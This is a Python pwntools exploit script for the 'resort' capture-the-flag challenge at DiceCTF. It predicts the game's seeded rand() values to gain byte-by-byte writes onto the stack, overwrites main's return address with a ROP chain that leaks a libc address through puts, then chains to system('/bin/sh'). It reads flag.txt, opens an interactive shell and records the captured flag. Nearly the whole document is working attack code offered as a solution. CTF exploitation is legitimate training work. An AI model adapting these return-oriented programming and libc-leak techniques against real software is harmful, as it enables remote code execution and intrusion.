#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from ctypes import *
from enum import Enum

context.update(arch="amd64")
context.log_level = logging.INFO
context.terminal = ["tmux", "splitw", "-h", "-P"]
exe = "./resort_patched"
libc = ELF("./libc.so.6")

libc_bin = cdll.LoadLibrary("./libc.so.6")
libc_bin.srand(1)

host = args.HOST or "dicec.tf"
port = int(args.PORT or 32030)


def start_local(argv=[], *a, **kw):
    """Execute the target binary locally"""
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    """Connect to the process on the remote host"""
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


random = 0


class Rand(Enum):
    Item = 1
    Dmg = 2


def rand(type: Rand) -> int:
    if type == Rand.Item:
        return libc_bin.rand() % 4
    else:
        return libc_bin.rand() % 255


def init() -> int:
    io.recvuntil("@ ")
    raw = io.recvuntil(" ").decode()
    return int(raw, 16)


def play(choice: int) -> int:
    global random

    item = rand(Rand.Item)

    dmg = 0
    if item == 3:
        dmg = 1000
    else:
        dmg = rand(Rand.Dmg)

    # choice + 1 to balance with -1 in code
    io.sendline(str(choice + 1).encode())

    return dmg


def play_null_only(choice: int) -> int:
    global random

    item = rand(Rand.Item)
    line = io.recvuntil(b" > ")

    if item != 3:
        dmg = rand(Rand.Dmg)
        # write to a garbage location and return
        io.sendline(b"0")
        raise ValueError

    # choice + 1 to balance with -1 in code
    io.sendline(str(choice + 1).encode())

    return 0


def win():
    for i in range(0, 3):
        write_null(i)


def write_null(choice: int):
    while True:
        try:
            play_null_only(choice)
            return
        except ValueError:
            continue


def write_val(choice: int, val: int):
    write_null(choice)
    if val == 0:
        return

    hp = 0
    while True:
        try:
            dmg = play(choice)
            if dmg == 1000:
                hp = 0
            elif dmg <= hp:
                hp -= dmg
            else:
                hp = 256 - (dmg - hp)

            if hp == val:
                break
        except ValueError:
            continue


def write_64(choice: int, val: int, force: bool = False):
    for i in range(8):
        v = (val >> (i * 8)) & 0xFF
        if i > 5 and not force:
            return
        elif (v == 0 and i <= 5) or (i > 5 and force):
            write_null(choice + i)
        else:
            write_val(choice + i, v)


gdbscript = """
# brva 0x16e5
brva 0x179d
continue
""".format(
    **locals()
)

io = start()

bin_leak = init()
bin_base = bin_leak - (0x5555555551E0 - 0x555555554000)
info(f"bin: {hex(bin_base)}")


# overwrite main ret addr
main_ret_addr = 0x7FFCDAC00738 - 0x7FFCDAC006CC
pop_rdi_pop_rbp_ret = bin_base + 0x179B
dummy_ret = bin_base + 0x101A
puts_got = bin_base + (0x5606974F9F98 - 0x5606974F6000)
printf_plt = bin_base + (0x5606974F7050 - 0x5606974F6000)
main = bin_base + (0x5606974F75D0 - 0x5606974F6000)

write_64(main_ret_addr, pop_rdi_pop_rbp_ret)
write_64(main_ret_addr + 8, puts_got)  # puts got entry
# skip pop rbp, pop garbage
write_64(main_ret_addr + 0x18, printf_plt)  # printf plt
write_64(main_ret_addr + 0x20, dummy_ret)
write_64(main_ret_addr + 0x28, main)  # main

win()

io.recvuntil("wins!\n")

leak = u64(io.recv(6).ljust(8, p8(0)))

libc.address = leak - (0x7FC185680E50 - 0x7FC185600000)
info(f"libc: {hex(libc.address)}")

# back in main again

bin_sh = libc.address + 0x1D8678
pop_rdi_ret = libc.address + 0x1BBEA1

write_64(main_ret_addr, pop_rdi_ret, True)
write_64(main_ret_addr + 8, bin_sh)
write_64(main_ret_addr + 0x10, dummy_ret)
write_64(main_ret_addr + 0x18, libc.sym["system"])

win()

io.recvuntil("wins!")

io.sendline(b"cat flag.txt")
info(io.recvline())

io.interactive()

# dice{clearing_the_dust_with_the_power_of_segmentation_fault_core_dumped_ae1f9557}
